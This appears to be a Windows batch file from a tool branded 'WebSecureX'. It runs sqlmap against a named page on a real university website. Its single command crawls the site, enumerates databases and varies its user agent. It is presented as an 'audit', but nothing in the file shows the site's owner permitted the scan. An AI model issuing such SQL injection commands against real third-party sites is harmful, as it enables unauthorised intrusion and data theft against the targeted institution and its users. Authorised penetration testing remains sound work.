@echo off
title sqlmap SQL INJECTION ENGINE
color 0A
echo.
echo  [ WebSecureX ] ENGINE: sqlmap SQL INJECTION ENGINE
echo  Powered by WebSecureX Security Platform
echo.
echo  Target: https://pu.edu.pk/home/bs4yearsdegree/BS-4Years-Information-Technology-NC.html
echo.
echo ============================================================
echo  AUDIT IN PROGRESS — DO NOT CLOSE THIS WINDOW
echo ============================================================
echo.
E:\WebSecureX.(2)\venv\Scripts\python.exe ..\engines\sqli_engine\sqlmap\sqlmap.py -u https://pu.edu.pk/home/bs4yearsdegree/BS-4Years-Information-Technology-NC.html --batch --random-agent --dbs --crawl=2 --threads=3 --level=1 --risk=1 --output-dir=E:\WebSecureX.(2)\python-backend\reports\ff21231e-baf7-4160-93b5-91de019633ec\sqlmap
echo.
echo ============================================================
echo  SCAN COMPLETE — This window closes in 30 seconds
echo ============================================================
timeout /t 30 /nobreak > nul